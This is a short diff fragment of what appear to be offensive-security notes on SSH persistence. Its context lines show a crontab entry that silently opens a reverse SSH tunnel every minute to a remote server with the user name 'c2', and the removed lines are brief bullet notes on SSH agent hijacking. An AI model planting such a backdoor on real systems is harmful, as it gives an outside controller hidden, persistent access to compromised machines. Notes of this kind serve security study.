@@ -66,10 +66,3 @@ Crontab.
 MAILTO=""
 * * * * * (ssh -p 443 -fNR 127.0.0.1:4450:127.0.0.1:22 c2@197.15.100.245 &>/dev/null &)  
 ```
-
-## SSH Agent Attacks
-
-- ssh-agent remote host session hijacking (/tmp/ssh-agent/...)
-- ssh-agent attacks?
-- ProxyJump => sshd, localhost => sshd => TCP forward
-- compromised host and /usr/sbin/sshd?
